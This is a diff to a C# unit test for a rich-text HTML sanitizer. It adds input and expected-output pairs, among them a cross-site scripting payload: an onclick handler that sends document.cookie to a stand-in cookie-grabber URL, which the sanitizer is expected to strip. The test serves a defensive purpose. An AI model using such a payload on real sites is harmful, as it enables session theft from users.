@@ -29,9 +29,11 @@ namespace BBC.Dna.Api.Tests
 
             testDataRichText = new List<string[]>();
             testDataRichText.Add(new[] { "test", "test" });
-            testDataRichText.Add(new[] { "<b>test</b>", "<b>test</b>" });
+            testDataRichText.Add(new[] { "<b>test</b>", "<B>test</B>" });
             testDataRichText.Add(new[] { "test\r\nnewline", "test<BR />newline" });
             testDataRichText.Add(new[] { "<script>test</script>", "test" });
+            testDataRichText.Add(new[] { "this is a <p onclick=\"window.location='http://www.somehackysite.tk/cookie_grabber.php?c=' + document.cookie\">test</p> for bad html tags.", "this is a <P>test</P> for bad html tags." });
+            
 
             testDataOther = new List<string[]>();
             testDataOther.Add(new[] { "test", "test" });
